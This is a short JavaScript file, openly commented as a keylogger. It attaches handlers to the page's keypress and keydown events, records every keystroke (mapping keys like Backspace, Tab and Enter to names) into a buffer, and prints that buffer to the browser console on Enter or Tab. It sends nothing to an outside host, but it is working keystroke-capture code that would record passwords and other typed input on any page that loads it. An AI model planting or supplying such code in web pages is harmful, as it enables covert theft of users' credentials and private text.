var title=document.title;
console.log("Welcome to ",title);
var str="";


//Hash map for charCode to KeyName

var keyName= {
    8:"[BACKSPACE]",
    9:"[TAB]",
    16:"[SHIFT]",
    17:"[CTR]",
    18:"[ALT]",
    20:"[CAPSLOCK]",
    32:"[SPACE]",
    37:"[<-]",
    39:"[->]",
    13:"[ENTER]"
}

var printNow=[9,10,13];


//KeyLogger Start from here

document.onkeypress=(e)=>{
    e = e || window.event;
    var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
    console.log("onkeypress"+charCode+" "+String.fromCharCode(charCode));
    if(charCode==10) 
        console.log(str),str="";
    else 
        str+=String.fromCharCode(charCode);
};



document.onkeydown=(e)=>{
    var charCode=e.keyCode;
    console.log("onkeydown"+charCode +" "+String.fromCharCode(charCode));
    if(keyName[charCode] !==undefined)
    str+=keyName[charCode];
    if(printNow.indexOf(charCode)!==-1)
        console.log(str),str="";
}